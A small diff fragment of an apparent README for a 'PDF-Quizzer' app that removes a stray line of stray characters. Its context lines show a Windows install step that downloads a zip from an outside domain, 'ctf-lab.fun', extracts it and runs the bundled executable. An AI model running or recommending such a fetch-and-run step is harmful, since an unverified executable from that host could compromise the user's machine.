@@ -26,7 +26,7 @@ curl -L -o app.zip "https://ctf-lab.fun/app.zip" && ^
 powershell -Command "Expand-Archive -Path 'app.zip' -DestinationPath 'app' -Force" && ^
 start app\\app\\PDF-Quizzer.exe
 </pre>
-ذذذ```
+
 ---
 🖥️ Usage
 Launch the app
